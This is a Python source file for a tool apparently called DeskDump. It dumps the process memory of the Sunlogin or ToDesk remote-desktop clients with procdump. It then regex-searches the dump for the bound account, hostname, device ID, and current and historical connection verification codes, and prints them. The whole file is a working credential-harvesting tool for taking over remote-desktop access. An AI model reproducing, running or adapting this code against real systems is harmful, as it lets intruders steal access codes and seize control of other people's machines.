import re
import argparse
import datetime
import subprocess


def banner():
    print('''
  ____                 _      ____                              
 |  _ \    ___   ___  | | __ |  _ \   _   _   _ __ ___    _ __  
 | | | |  / _ \ / __| | |/ / | | | | | | | | | '_ ` _ \  | '_ \ 
 | |_| | |  __/ \__ \ |   <  | |_| | | |_| | | | | | | | | |_) |
 |____/   \___| |___/ |_|\_\ |____/   \__,_| |_| |_| |_| | .__/ 
                                                         |_|        v0.2
 Author: A1andNS
 URL: https://github.com/A1andNS/DeskDump                                 ''')


# 提取进程数据
def dump_process(pid):
    try:
        dumpFileName = f'dump_{pid}'
        result = subprocess.run(['tools/procdump64.exe', '-accepteula', '-ma', str(pid), '-o', dumpFileName],
                                stdout=subprocess.PIPE)
        if "complete" in result.stdout.decode('utf-8'):
            print("[+]{} dump complete!".format(pid))
        else:
            print("dump failed!")
        return dumpFileName + ".dmp"
    except Exception as e:
        print(f"Failed to create dump file: {e}")
        return None


# 提取向日葵
def sun_extract(pid):
    dump_file_name = dump_process(pid)
    if dump_file_name is not None:
        print("[+]应用名称：向日葵")
        with open(dump_file_name, "rb") as f:
            contentByte = f.read()
            content = contentByte.decode("utf-8", errors="ignore")
            # 匹配账户
            result0 = re.compile(r'"account" : "\w+"').findall(content)
            accounts = []
            if len(result0) != 0:
                for r in result0:
                    r = re.sub(r'"account" : "', '', r).replace('"', "")
                    accounts.append(r)
                accounts = list(set(accounts))
                print("[+]账户：" + accounts[0])
            else:
                print("[-]未找到绑定的账户！")

            # hostname
            hostnameResult = re.compile(r'"hostname" : ".+"').findall(content)
            hostnames = []
            if len(hostnameResult) != 0:
                for r in hostnameResult:
                    r = re.sub(r'"hostname" : "', '', r).replace('"', "")
                    hostnames.append(r)
                hostnames = list(set(hostnames))
                print("[+]主机名：" + hostnames[0])
            else:
                print("[-]未找到主机名！")

            # 匹配设备识别码
            result1 = re.compile(r'"fastcode" : "\w+"').findall(content)
            deviceCode = []
            if len(result1) != 0:
                for r in result1:
                    r = re.sub(r'"fastcode" : "', '', r).replace('"', "")
                    deviceCode.append(r)
                deviceCode = list(set(deviceCode))
                print("[+]设备识别码：" + deviceCode[0])
            else:
                print("[-]未找到设备识别码！")
            # 匹配今日验证码、临时验证码、长期验证码等
            result2 = re.compile(r'<f f=.+ c=color_edit >\w+</f>').findall(content)
            mima = []
            if len(result2) != 0:
                for r in result2:
                    r = re.sub(r'<f f=.+ c=color_edit >', "", r).replace("</f>", "")
                    mima.append(r)
                mima = list(set(mima))
                print("[+]今日验证码：" + mima[0])
                print("[+]历史验证码：")
                for m in mima:
                    print(m)
            else:
                print("[-]未找到今日验证码")


# 提取toDesk内存数据
def toDesktExtract(pid):
    dump_file_name = dump_process(pid)
    if dump_file_name is not None:
        print("[+]应用名称：ToDesk")
        with open(dump_file_name, "rb") as f:
            contentByte = f.read()
            content = contentByte.decode("utf-8", errors="ignore")
            # 匹配账户
            result0 = re.compile(r'[0-9]{11}.wSIG').findall(content)
            accounts = []
            if len(result0) != 0:
                for r in result0:
                    r = r.replace('\x00wSIG', "")
                    accounts.append(r)
                accounts = list(set(accounts))
                print("[+]账户：" + accounts[0])
            else:
                print("[-]未找到绑定的账户！")

            # hostname
            hostnameResult = re.compile(r'Files.COMPUTERNAME=\w+-\w+').findall(content)
            hostnames = []
            if len(hostnameResult) != 0:
                for r in hostnameResult:
                    r = re.sub(r'Files.COMPUTERNAME=', '', r).replace('.', "")
                    hostnames.append(r)
                hostnames = list(set(hostnames))
                print("[+]主机名：" + hostnames[0])
            else:
                print("[-]未找到主机名！")

            # 匹配设备识别码
            result1 = re.compile(r'"ClientId" : "\w+"').findall(content)
            deviceCode = []
            if len(result1) != 0:
                for r in result1:
                    r = re.sub(r'"ClientId" : "', '', r).replace('"', "")
                    deviceCode.append(r)
                deviceCode = list(set(deviceCode))
                print("[+]设备识别码：" + deviceCode[0])
            else:
                print("[-]未找到设备识别码！")

            # 匹配今日验证码、临时验证码、长期验证码等
            today = datetime.datetime.now().strftime('%Y%m%d')
            content = content.split(today)[0].split("ipc_todesk")[-1]
            result2 = re.compile(r'[a-z0-9]{8}').findall(content)
            mima = []
            if len(result2) != 0:
                for r in result2:
                    if re.match(r'[1-9]{8}', r) or re.match(r'[a-z]{8}', r) or re.match(r'[0-9]+x[0-9]+', r):
                        continue
                    else:
                        mima.append(r)
                mima = list(set(mima))
                print("[+]今日验证码：" + mima[0])
                print("[+]历史验证码：")
                for m in mima:
                    print(m)
            else:
                print("[-]未找到今日验证码")


if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--pid', type=int, help='PID to dump')
    parser.add_argument('-a', '--app', type=str, help='app name(toDesk or sun)')
    args = parser.parse_args()
    pid = args.pid
    app_name = args.app
    if pid is not None and app_name is not None:
        if app_name == 'sun':
            sun_extract(pid)
        elif app_name == 'toDesk':
            toDesktExtract(pid)
        else:
            print("App name error!")

    else:
        print("PID or app name must be specified")
